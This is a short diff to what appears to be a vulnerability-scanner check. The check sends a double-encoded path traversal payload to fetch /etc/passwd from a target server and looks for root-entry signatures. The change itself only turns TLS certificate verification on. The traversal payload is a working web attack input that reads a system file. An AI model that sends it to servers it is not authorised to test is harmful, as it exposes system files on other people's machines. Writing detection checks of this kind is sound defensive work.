@@ -28,7 +28,7 @@ def check(url, dns_domain, proxies=None):
     payload = "test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
     target_url = urljoin(url, payload)
     try:
-        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
+        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=True, proxies=proxies)
         logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
         vulnerable_signs = [
             r"x:0:0:root:/root:",
